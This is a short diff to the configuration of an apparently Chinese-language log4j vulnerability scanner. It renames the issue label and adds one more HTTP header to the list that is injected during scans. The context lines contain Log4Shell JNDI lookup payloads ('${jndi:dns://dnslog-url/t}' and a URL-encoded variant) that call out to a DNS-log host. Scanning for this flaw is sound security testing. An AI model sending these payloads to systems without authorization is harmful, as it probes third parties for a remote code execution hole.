@@ -97,7 +97,7 @@ application:
       # 声明使用 Application.RemoteCmdExtension.ExtensionMethod 的哪个类,为该扩展提供服务
       provider: "RemoteCmdScan"
       # 漏洞名称
-      issueName: "log4j-RemoteCmd"
+      issueName: "log4j2-RemoteCmd"
       # 表示进行漏洞扫描的header头
       # 添加以后每个请求都会自动带上这些header进行漏洞扫描
       # 添加这些header头,并不会产生额外的请求,放心添加
@@ -118,6 +118,7 @@ application:
         - "Client-IP"
         - "X-Wap-Profile"
         - "X-Api-Version"
+        - "If-Modified-Since"
       payloads:
         - "${jndi:dns://dnslog-url/t}"
         - "%24%7Bjndi%3Adns%3A%2F%2Fdnslog-url%2Ft%7D"
